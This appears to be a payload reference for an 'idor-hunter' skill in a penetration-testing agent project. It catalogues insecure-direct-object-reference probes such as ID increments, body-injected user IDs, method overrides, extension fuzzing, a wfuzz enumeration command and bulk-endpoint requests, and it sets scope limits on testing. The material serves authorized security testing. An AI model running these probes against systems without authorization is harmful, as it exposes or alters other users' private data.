# payloads — idor-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Completo de Testes e Mitigação de IDOR.md` (Section 5: PAYLOADS / PROBES)

IDOR is not a string-payload vulnerability like XSS — it's a parameter-
manipulation vulnerability. "Payloads" here are systematic alterations
of existing request parameters.

---

## Step 0 — Establish Two Accounts

Create two test accounts with IDENTICAL permission levels (Alice and Bob).
Capture their baseline authenticated requests with a proxy. The test is
whether Alice's session can access Bob's resources via parameter change.

---

## 1. Sequential Integer Probes

Most common — user IDs, invoice IDs, message IDs, document IDs are numeric
and sequential.

```
GET /api/users/1001    → baseline (Alice's own record)
GET /api/users/1002    → Bob's record? Should be 403.
GET /api/users/1       → admin or root user
GET /api/users/0       → sometimes reveals system-user records
GET /api/users/-1      → negative test
```

## 2. UUID / GUID Probes

UUIDs look random but may be predictable (v1 is MAC + timestamp; v4 is
random; some apps use truncated timestamps):

```
# Capture several UUIDs you create in rapid succession.
# Check for:
#  - Sequential / monotonic bits (v1 UUIDs reveal creation order)
#  - Truncated / predictable portions
```

If UUIDs leak in logs / notification emails / URLs sent to other users,
Alice can still hit `/api/documents/<bob-uuid>`.

## 3. Encoded ID Manipulation

```
# Base64-encoded IDs
GET /api/records/MTIzNQ==        → decode = 1235; try MTIzNg== (1236)
GET /api/records/MTA0Ng==        → decode = 1046

# Hex-encoded
GET /api/records/0x4D2           → 1234 in hex; try 0x4D3
```

Decode the ID, increment/decrement, re-encode, replay.

## 4. Parameter Injection (ID-less requests)

The request normally has no ID — identity is inferred from the session.
Add an ID parameter explicitly:

```http
# Baseline — no ID in body, session-bound
POST /api/profile/update HTTP/1.1
Cookie: sess=alice_session
Content-Type: application/json

{"name": "Alice"}

# Test — add user_id, see if server prefers the body value
POST /api/profile/update HTTP/1.1
Cookie: sess=alice_session
Content-Type: application/json

{"user_id": 1002, "name": "pwned"}
```

If Bob's record changes, the server honoured the supplied ID.

## 5. HTTP Method Swapping

Authorization is sometimes only applied on the original method (e.g. GET).
Try the same path with other verbs:

```
GET    /api/admin/users/1002           → 403 baseline
POST   /api/admin/users/1002           → ??
PUT    /api/admin/users/1002           → ??
PATCH  /api/admin/users/1002           → ??
DELETE /api/admin/users/1002           → ??
HEAD   /api/admin/users/1002           → ??

# Also try method overrides if the server honours them:
POST /api/admin/users/1002 X-HTTP-Method-Override: PUT
POST /api/admin/users/1002 _method=DELETE
```

## 6. File-Extension Fuzz

Some APIs switch controllers based on extension — bypasses auth middleware:

```
GET /api/receipts/2983              → 403
GET /api/receipts/2983.json         → 200 (auth-less JSON endpoint)
GET /api/receipts/2983.xml
GET /api/receipts/2983.pdf
GET /api/receipts/2983.csv
```

## 7. Query-String Parameter Pollution

When user_id appears as a query parameter:

```
GET /api/docs?user_id=1001                        → Alice's docs
GET /api/docs?user_id=1001&user_id=1002           → server uses 1001 or 1002?
GET /api/docs?user_id[]=1001&user_id[]=1002       → array form
```

See also `mass-assignment-hunter` — HPP and IDOR overlap here.

## 8. Unauthenticated Access

Drop all auth headers; try the endpoint cold:

```bash
# Remove Authorization header and cookies
curl -i "https://target/api/users/1002"
```

If it returns data, the auth check was session-side only, not endpoint-side.

## 9. Horizontal Priv-Esc Automation

When you've confirmed an IDOR, run a brute-enumeration to estimate blast
radius (NOT for mass exfiltration — for counting affected records only).

```bash
# wfuzz — enumerate valid IDs in a range
wfuzz -c \
  -w ids.txt \
  -b "sess=alice_session" \
  -u "https://target/api/users/FUZZ" \
  --hc 403,404 -t 10

# Prefer a small range (100 IDs) first; do NOT enumerate the full ID space
# without destructive_testing: approved.
```

## 10. Batch / Bulk Endpoint Abuse

Modern REST often has bulk endpoints. A per-item auth check may be missed:

```json
POST /api/invoices/bulk-export
Content-Type: application/json
Cookie: sess=alice_session

{
  "invoice_ids": [1001, 1002, 1003, 2500, 9999]   // 1001 is Alice's, others might leak
}
```

## 11. GraphQL IDOR (handoff to `graphql-hunter`)

GraphQL queries take `id` as an argument or use relay global IDs
(`base64(type:id)`). Alice's query for `user(id: "<bob-id>")` is still an
IDOR — the graphql-hunter skill covers the relay-ID decoding in detail.

## 12. Cross-Resource IDOR

An API that shows public objects may leak a private-object reference:

```
GET /api/posts/42                    → public post
     response: {"author_id": 17, ...}

# Now chain: use author_id=17 in a private endpoint:
GET /api/users/17/messages           → private
```

---

## Signal Classification (what counts as a hit)

| Response                                                 | Classification        |
|----------------------------------------------------------|-----------------------|
| 200 + Bob's resource content                             | Confirmed IDOR        |
| 200 + generic "Resource Not Found" body                  | Probably not IDOR (but suspicious; verify the error fidelity) |
| 403 / 401                                                | Properly authorized   |
| 200 + empty list / null                                  | Ambiguous — test with known-public object to confirm endpoint semantics |
| 500                                                      | Investigate — leaks via error messages are secondary findings |

---

## Safety / Scope

- Mass ID enumeration (thousands of rows) is EXFILTRATION, not testing.
  Stop after confirming 1-3 unauthorized accesses; report blast radius
  based on sample.
- Write-based IDOR (DELETE / PUT / PATCH) must have
  `destructive_testing: approved` in `security-scope.yaml`. Use a
  throwaway Bob account whose state you don't care about.
- Avoid sensitive-PII endpoints on real customer records; request the
  vendor to seed synthetic PII if needed.
